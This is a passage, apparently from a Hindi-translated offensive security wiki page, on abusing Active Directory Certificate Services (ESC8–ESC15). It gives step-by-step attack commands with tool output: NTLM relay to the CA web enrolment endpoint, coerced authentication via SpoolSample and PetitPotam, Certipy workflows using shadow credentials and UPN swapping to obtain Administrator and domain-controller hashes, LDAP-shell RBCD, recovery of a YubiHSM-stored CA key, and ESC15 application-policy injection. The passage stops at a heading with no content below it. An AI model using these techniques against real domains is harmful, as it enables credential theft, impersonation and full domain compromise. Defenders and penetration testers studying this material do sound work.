- **वेब नामांकन इंटरफेस** (एक पुरानी ASP एप्लिकेशन जो `http://<caserver>/certsrv/` पर उपलब्ध है), डिफ़ॉल्ट रूप से केवल HTTP पर सेट है, जो NTLM रिले हमलों के खिलाफ सुरक्षा प्रदान नहीं करता है। इसके अतिरिक्त, यह स्पष्ट रूप से केवल NTLM प्रमाणीकरण की अनुमति देता है अपने Authorization HTTP हेडर के माध्यम से, जिससे अधिक सुरक्षित प्रमाणीकरण विधियाँ जैसे Kerberos अनुपयुक्त हो जाती हैं।
- **प्रमाणपत्र नामांकन सेवा** (CES), **प्रमाणपत्र नामांकन नीति** (CEP) वेब सेवा, और **नेटवर्क डिवाइस नामांकन सेवा** (NDES) डिफ़ॉल्ट रूप से अपने Authorization HTTP हेडर के माध्यम से बातचीत प्रमाणीकरण का समर्थन करते हैं। बातचीत प्रमाणीकरण **दोनों** Kerberos और **NTLM** का समर्थन करता है, जिससे एक हमलावर **NTLM** प्रमाणीकरण में डाउनग्रेड कर सकता है। हालाँकि ये वेब सेवाएँ डिफ़ॉल्ट रूप से HTTPS सक्षम करती हैं, HTTPS अकेले **NTLM रिले हमलों से सुरक्षा नहीं करता है**। HTTPS सेवाओं के लिए NTLM रिले हमलों से सुरक्षा केवल तब संभव है जब HTTPS को चैनल बाइंडिंग के साथ जोड़ा जाए। दुर्भाग्यवश, AD CS IIS पर प्रमाणीकरण के लिए विस्तारित सुरक्षा को सक्रिय नहीं करता है, जो चैनल बाइंडिंग के लिए आवश्यक है।

NTLM रिले हमलों के साथ एक सामान्य **समस्या** NTLM सत्रों की **संक्षिप्त अवधि** और हमलावर की उन सेवाओं के साथ बातचीत करने में असमर्थता है जो **NTLM साइनिंग** की आवश्यकता होती है।

फिर भी, इस सीमा को एक NTLM रिले हमले का लाभ उठाकर उपयोगकर्ता के लिए एक प्रमाणपत्र प्राप्त करके पार किया जा सकता है, क्योंकि प्रमाणपत्र की वैधता अवधि सत्र की अवधि को निर्धारित करती है, और प्रमाणपत्र को उन सेवाओं के साथ उपयोग किया जा सकता है जो **NTLM साइनिंग** की आवश्यकता होती है। चुराए गए प्रमाणपत्र का उपयोग करने के लिए निर्देशों के लिए देखें:

{{#ref}}
account-persistence.md
{{#endref}}

NTLM रिले हमलों की एक और सीमा यह है कि **एक हमलावर-नियंत्रित मशीन को एक पीड़ित खाते द्वारा प्रमाणीकरण किया जाना चाहिए**। हमलावर या तो इंतजार कर सकता है या इस प्रमाणीकरण को **बलात्कृत** करने का प्रयास कर सकता है:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` प्रॉपर्टी का उपयोग एंटरप्राइज सर्टिफिकेट अथॉरिटीज़ (CAs) द्वारा सर्टिफिकेट एनरोलमेंट सर्विस (CES) एंडपॉइंट्स को स्टोर करने के लिए किया जाता है। इन एंडपॉइंट्स को टूल **Certutil.exe** का उपयोग करके पार्स और लिस्ट किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify का दुरुपयोग
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

सर्टिफिकेट के लिए अनुरोध Certipy द्वारा डिफ़ॉल्ट रूप से `Machine` या `User` टेम्पलेट के आधार पर किया जाता है, जो इस पर निर्भर करता है कि क्या रिले किया जा रहा खाता नाम `$` पर समाप्त होता है। एक वैकल्पिक टेम्पलेट का निर्दिष्ट करना `-template` पैरामीटर का उपयोग करके किया जा सकता है।

एक तकनीक जैसे [PetitPotam](https://github.com/ly4k/PetitPotam) का उपयोग फिर प्रमाणीकरण को मजबूर करने के लिए किया जा सकता है। डोमेन नियंत्रकों के साथ काम करते समय, `-template DomainController` का निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

नया मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) के लिए **`msPKI-Enrollment-Flag`**, जिसे ESC9 कहा जाता है, एक प्रमाणपत्र में **नए `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा विस्तार** को एम्बेड करने से रोकता है। यह ध्वज तब प्रासंगिक हो जाता है जब `StrongCertificateBindingEnforcement` को `1` (डिफ़ॉल्ट सेटिंग) पर सेट किया गया हो, जो `2` के सेटिंग के विपरीत है। इसका महत्व उन परिदृश्यों में बढ़ जाता है जहां Kerberos या Schannel के लिए एक कमजोर प्रमाणपत्र मैपिंग का शोषण किया जा सकता है (जैसे ESC10 में), यह देखते हुए कि ESC9 की अनुपस्थिति आवश्यकताओं को नहीं बदलेगी।

इस ध्वज के सेटिंग के महत्वपूर्ण होने की शर्तें शामिल हैं:

- `StrongCertificateBindingEnforcement` को `2` पर समायोजित नहीं किया गया है (डिफ़ॉल्ट `1` है), या `CertificateMappingMethods` में `UPN` ध्वज शामिल है।
- प्रमाणपत्र को `msPKI-Enrollment-Flag` सेटिंग के भीतर `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज के साथ चिह्नित किया गया है।
- प्रमाणपत्र द्वारा किसी भी क्लाइंट प्रमाणीकरण EKU निर्दिष्ट किया गया है।
- किसी भी खाते पर `GenericWrite` अनुमतियाँ उपलब्ध हैं ताकि किसी अन्य को समझौता किया जा सके।

### Abuse Scenario

मान लीजिए `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` अनुमतियाँ हैं, जिसका लक्ष्य `Administrator@corp.local` को समझौता करना है। `ESC9` प्रमाणपत्र टेम्पलेट, जिसमें `Jane@corp.local` को नामांकित करने की अनुमति है, को इसके `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज के साथ कॉन्फ़िगर किया गया है।

शुरुआत में, `Jane` का हैश Shadow Credentials का उपयोग करके प्राप्त किया जाता है, धन्यवाद `John` के `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में संशोधित किया जाता है, जानबूझकर `@corp.local` डोमेन भाग को छोड़ दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन प्रतिबंधों का उल्लंघन नहीं करता है, यह देखते हुए कि `Administrator@corp.local` `Administrator` के `userPrincipalName` के रूप में अलग बना रहता है।

इसके बाद, `ESC9` प्रमाणपत्र टेम्पलेट, जिसे कमजोर माना गया है, को `Jane` के रूप में अनुरोध किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
यह नोट किया गया है कि प्रमाणपत्र का `userPrincipalName` `Administrator` को दर्शाता है, जिसमें कोई “object SID” नहीं है।

`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` में बदल दिया गया है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्रदत्त प्रमाणपत्र के साथ प्रमाणीकरण करने का प्रयास अब `Administrator@corp.local` का NT हैश देता है। कमांड में `-domain <domain>` शामिल होना चाहिए क्योंकि प्रमाणपत्र में डोमेन निर्दिष्ट नहीं है:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## कमजोर प्रमाणपत्र मैपिंग - ESC10

### व्याख्या

डोमेन नियंत्रक पर दो रजिस्ट्री कुंजी मान ESC10 द्वारा संदर्भित हैं:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के तहत `CertificateMappingMethods` के लिए डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`) है, जो पहले `0x1F` पर सेट था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के तहत `StrongCertificateBindingEnforcement` के लिए डिफ़ॉल्ट सेटिंग `1` है, जो पहले `0` थी।

**मामला 1**

जब `StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर किया गया है।

**मामला 2**

यदि `CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है।

### दुरुपयोग मामला 1

जब `StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर किया गया है, तो `GenericWrite` अनुमतियों के साथ एक खाता A का उपयोग किसी भी खाते B को समझौता करने के लिए किया जा सकता है।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` अनुमतियों के साथ, एक हमलावर `Administrator@corp.local` को समझौता करने का लक्ष्य रखता है। यह प्रक्रिया ESC9 के समान है, जो किसी भी प्रमाणपत्र टेम्पलेट का उपयोग करने की अनुमति देती है।

शुरुआत में, `Jane` का हैश Shadow Credentials का उपयोग करके प्राप्त किया जाता है, `GenericWrite` का दुरुपयोग करते हुए।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में बदल दिया जाता है, जानबूझकर `@corp.local` भाग को छोड़ दिया जाता है ताकि कोई बाधा उल्लंघन न हो।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
इसके बाद, डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करते हुए `Jane` के रूप में क्लाइंट प्रमाणीकरण सक्षम करने वाला एक प्रमाणपत्र अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` पर वापस लाया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्राप्त प्रमाणपत्र के साथ प्रमाणीकरण करने से `Administrator@corp.local` का NT हैश प्राप्त होगा, जो प्रमाणपत्र में डोमेन विवरण की अनुपस्थिति के कारण कमांड में डोमेन को निर्दिष्ट करने की आवश्यकता को दर्शाता है।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` में `UPN` बिट फ्लैग (`0x4`) होने के साथ, एक खाता A जिसमें `GenericWrite` अनुमतियाँ हैं, किसी भी खाते B को समझौता कर सकता है जिसमें `userPrincipalName` प्रॉपर्टी नहीं है, जिसमें मशीन खाते और अंतर्निहित डोमेन प्रशासक `Administrator` शामिल हैं।

यहाँ, लक्ष्य `DC$@corp.local` को समझौता करना है, `Jane` का हैश प्राप्त करने से शुरू करते हुए, Shadow Credentials के माध्यम से, `GenericWrite` का लाभ उठाते हुए।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
एक प्रमाणपत्र क्लाइंट प्रमाणीकरण के लिए `Jane` के रूप में डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करते हुए अनुरोध किया गया है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपने मूल पर वापस आ जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel के माध्यम से प्रमाणीकरण करने के लिए, Certipy का `-ldap-shell` विकल्प उपयोग किया जाता है, जो प्रमाणीकरण की सफलता को `u:CORP\DC$` के रूप में दर्शाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP शेल के माध्यम से, `set_rbcd` जैसे कमांड रिसोर्स-आधारित सीमित प्रतिनिधित्व (RBCD) हमलों को सक्षम करते हैं, जो संभावित रूप से डोमेन कंट्रोलर को खतरे में डाल सकते हैं।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
यह सुरक्षा कमी किसी भी उपयोगकर्ता खाते पर लागू होती है जिसमें `userPrincipalName` नहीं है या जहां यह `sAMAccountName` से मेल नहीं खाता, जिसमें डिफ़ॉल्ट `Administrator@corp.local` एक प्रमुख लक्ष्य है क्योंकि इसके पास उच्च LDAP विशेषाधिकार हैं और डिफ़ॉल्ट रूप से `userPrincipalName` की अनुपस्थिति है।

## NTLM को ICPR में रिले करना - ESC11

### व्याख्या

यदि CA सर्वर को `IF_ENFORCEENCRYPTICERTREQUEST` के साथ कॉन्फ़िगर नहीं किया गया है, तो यह RPC सेवा के माध्यम से बिना साइन किए NTLM रिले हमलों को सक्षम कर सकता है। [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)।

आप यह देखने के लिए `certipy` का उपयोग कर सकते हैं कि क्या `Enforce Encryption for Requests` अक्षम है और certipy `ESC11` कमजोरियों को दिखाएगा।
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

एक रिले सर्वर सेटअप करना आवश्यक है:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
नोट: डोमेन कंट्रोलर्स के लिए, हमें DomainController में `-template` निर्दिष्ट करना होगा।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करते हुए:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".

If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.

In first, you need to obtain the CA certificate (this is public) and then:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
अंत में, certutil `-sign` कमांड का उपयोग करके CA प्रमाणपत्र और इसके निजी कुंजी का उपयोग करके एक नया मनमाना प्रमाणपत्र तैयार करें।

## OID समूह लिंक दुरुपयोग - ESC13

### व्याख्या

`msPKI-Certificate-Policy` विशेषता प्रमाणपत्र टेम्पलेट में जारी करने की नीति को जोड़ने की अनुमति देती है। `msPKI-Enterprise-Oid` वस्तुएं जो नीतियों को जारी करने के लिए जिम्मेदार हैं, PKI OID कंटेनर के कॉन्फ़िगरेशन नामकरण संदर्भ (CN=OID,CN=Public Key Services,CN=Services) में खोजी जा सकती हैं। एक नीति को इस वस्तु की `msDS-OIDToGroupLink` विशेषता का उपयोग करके एक AD समूह से जोड़ा जा सकता है, जिससे एक प्रणाली को उस उपयोगकर्ता को अधिकृत करने की अनुमति मिलती है जो प्रमाणपत्र प्रस्तुत करता है जैसे कि वह समूह का सदस्य हो। [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

दूसरे शब्दों में, जब एक उपयोगकर्ता को एक प्रमाणपत्र में नामांकित करने की अनुमति होती है और प्रमाणपत्र एक OID समूह से जुड़ा होता है, तो उपयोगकर्ता इस समूह के विशेषाधिकारों को विरासत में ले सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

एक उपयोगकर्ता अनुमति खोजें जिसे `certipy find` या `Certify.exe find /showAllPermissions` का उपयोग किया जा सके।

यदि `John` को `VulnerableTemplate` में नामांकित करने की अनुमति है, तो उपयोगकर्ता `VulnerableGroup` समूह के विशेषाधिकारों को विरासत में ले सकता है।

उसे केवल टेम्पलेट निर्दिष्ट करने की आवश्यकता है, यह OIDToGroupLink अधिकारों के साथ एक प्रमाणपत्र प्राप्त करेगा।
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Explanation

The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. Below is a quotation of the original text.

ESC14 "कमजोर स्पष्ट प्रमाणपत्र मैपिंग" से उत्पन्न होने वाली कमजोरियों को संबोधित करता है, मुख्य रूप से Active Directory उपयोगकर्ता या कंप्यूटर खातों पर `altSecurityIdentities` विशेषता के दुरुपयोग या असुरक्षित कॉन्फ़िगरेशन के माध्यम से। यह बहु-मूल्य विशेषता प्रशासकों को प्रमाणीकरण उद्देश्यों के लिए AD खाते के साथ X.509 प्रमाणपत्रों को मैन्युअल रूप से जोड़ने की अनुमति देती है। जब भरा जाता है, तो ये स्पष्ट मैपिंग डिफ़ॉल्ट प्रमाणपत्र मैपिंग लॉजिक को ओवरराइड कर सकते हैं, जो आमतौर पर प्रमाणपत्र के SAN में UPNs या DNS नामों, या `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा विस्तार में एम्बेडेड SID पर निर्भर करता है।

एक "कमजोर" मैपिंग तब होती है जब `altSecurityIdentities` विशेषता के भीतर प्रमाणपत्र की पहचान करने के लिए उपयोग किया जाने वाला स्ट्रिंग मान बहुत व्यापक, आसानी से अनुमानित, गैर-विशिष्ट प्रमाणपत्र क्षेत्रों पर निर्भर करता है, या आसानी से धोखा देने योग्य प्रमाणपत्र घटकों का उपयोग करता है। यदि एक हमलावर एक ऐसा प्रमाणपत्र प्राप्त कर सकता है या तैयार कर सकता है जिसके गुण ऐसे कमजोर परिभाषित स्पष्ट मैपिंग के लिए एक विशेषाधिकार प्राप्त खाते से मेल खाते हैं, तो वे उस प्रमाणपत्र का उपयोग करके उस खाते के रूप में प्रमाणीकरण कर सकते हैं और उसकी नकल कर सकते हैं।

कमजोर `altSecurityIdentities` मैपिंग स्ट्रिंग के संभावित उदाहरणों में शामिल हैं:

- केवल सामान्य विषय सामान्य नाम (CN) द्वारा मैपिंग: उदाहरण के लिए, `X509:<S>CN=SomeUser`। एक हमलावर इस CN के साथ एक प्रमाणपत्र एक कम सुरक्षित स्रोत से प्राप्त कर सकता है।
- अत्यधिक सामान्य जारीकर्ता विशिष्ट नाम (DNs) या विषय DNs का उपयोग करना बिना किसी विशेष अनुक्रमांक या विषय कुंजी पहचानकर्ता जैसे आगे की योग्यता के: उदाहरण के लिए, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`।
- अन्य पूर्वानुमानित पैटर्न या गैर-क्रिप्टोग्राफिक पहचानकर्ताओं का उपयोग करना जिन्हें एक हमलावर एक प्रमाणपत्र में संतोषजनक रूप से पूरा कर सकता है जिसे वे वैध रूप से प्राप्त कर सकते हैं या धोखा दे सकते हैं (यदि उन्होंने एक CA से समझौता किया है या ESC1 में एक कमजोर टेम्पलेट पाया है)।

`altSecurityIdentities` विशेषता मैपिंग के लिए विभिन्न प्रारूपों का समर्थन करती है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (पूर्ण जारीकर्ता और विषय DN द्वारा मैप करता है)
- `X509:<SKI>SubjectKeyIdentifier` (प्रमाणपत्र के विषय कुंजी पहचानकर्ता विस्तार मान द्वारा मैप करता है)
- `X509:<SR>SerialNumberBackedByIssuerDN` (क्रमांक द्वारा मैप करता है, जो अप्रत्यक्ष रूप से जारीकर्ता DN द्वारा योग्य है) - यह एक मानक प्रारूप नहीं है, आमतौर पर यह `<I>IssuerDN<SR>SerialNumber` होता है।
- `X509:<RFC822>EmailAddress` (SAN से RFC822 नाम, आमतौर पर एक ईमेल पता, द्वारा मैप करता है)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (प्रमाणपत्र की कच्ची सार्वजनिक कुंजी के SHA1 हैश द्वारा मैप करता है - सामान्यतः मजबूत)

इन मैपिंग की सुरक्षा चुने गए प्रमाणपत्र पहचानकर्ताओं की विशिष्टता, अद्वितीयता और क्रिप्टोग्राफिक ताकत पर बहुत अधिक निर्भर करती है। डोमेन नियंत्रकों पर मजबूत प्रमाणपत्र बाइंडिंग मोड सक्षम होने के बावजूद (जो मुख्य रूप से SAN UPNs/DNS और SID विस्तार पर आधारित अप्रत्यक्ष मैपिंग को प्रभावित करते हैं), एक खराब कॉन्फ़िगर किया गया `altSecurityIdentities` प्रविष्टि अभी भी नकल के लिए एक सीधा मार्ग प्रस्तुत कर सकता है यदि मैपिंग लॉजिक स्वयं दोषपूर्ण या बहुत अनुमति देने वाला है।
### Abuse Scenario

ESC14 **स्पष्ट प्रमाणपत्र मैपिंग** को Active Directory (AD) में लक्षित करता है, विशेष रूप से `altSecurityIdentities` विशेषता। यदि यह विशेषता सेट की गई है (डिज़ाइन द्वारा या गलत कॉन्फ़िगरेशन के कारण), तो हमलावर मैपिंग से मेल खाने वाले प्रमाणपत्र प्रस्तुत करके खातों की नकल कर सकते हैं।

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Attacker has write permissions to the target account’s `altSecurityIdentities` attribute or the permission to grant it in the form of one of the following permissions on the target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: The target has a weak X509RFC822 mapping in altSecurityIdentities. An attacker can set the victim's mail attribute to match the target's X509RFC822 name, enroll a certificate as the victim, and use it to authenticate as the target.
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: The target has a weak X509IssuerSubject explicit mapping in `altSecurityIdentities`.The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509IssuerSubject mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: The target has a weak X509SubjectOnly explicit mapping in `altSecurityIdentities`. The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509SubjectOnly mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
प्रमाणपत्र को सहेजें और परिवर्तित करें
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
प्रमाणित करें (सर्टिफिकेट का उपयोग करके)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
साफ-सफाई (वैकल्पिक)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

The description at https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is remarkably thorough. Below is a quotation of the original text.

बिल्ट-इन डिफ़ॉल्ट संस्करण 1 सर्टिफिकेट टेम्पलेट्स का उपयोग करते हुए, एक हमलावर एक CSR तैयार कर सकता है जिसमें एप्लिकेशन नीतियाँ शामिल हैं जो टेम्पलेट में निर्दिष्ट कॉन्फ़िगर की गई एक्सटेंडेड की उपयोग विशेषताओं की तुलना में प्राथमिकता दी जाती हैं। एकमात्र आवश्यकता नामांकन अधिकार है, और इसका उपयोग क्लाइंट प्रमाणीकरण, सर्टिफिकेट अनुरोध एजेंट, और कोडसाइनिंग सर्टिफिकेट उत्पन्न करने के लिए किया जा सकता है **_WebServer_** टेम्पलेट का उपयोग करके।

### Abuse

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation via Schannel

**Step 1: एक प्रमाणपत्र का अनुरोध करें, "क्लाइंट प्रमाणीकरण" एप्लिकेशन नीति और लक्षित UPN को इंजेक्ट करते हुए।** हमलावर `attacker@corp.local` `administrator@corp.local` को "WebServer" V1 टेम्पलेट का उपयोग करके लक्षित करता है (जो नामांकित द्वारा प्रदान किए गए विषय की अनुमति देता है)।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: कमजोर V1 टेम्पलेट जिसमें "Enrollee supplies subject" है।
- `-application-policies 'Client Authentication'`: CSR के Application Policies एक्सटेंशन में OID `1.3.6.1.5.5.7.3.2` को इंजेक्ट करता है।
- `-upn 'administrator@corp.local'`: अनुकरण के लिए SAN में UPN सेट करता है।

**Step 2: प्राप्त प्रमाणपत्र का उपयोग करके Schannel (LDAPS) के माध्यम से प्रमाणीकरण करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

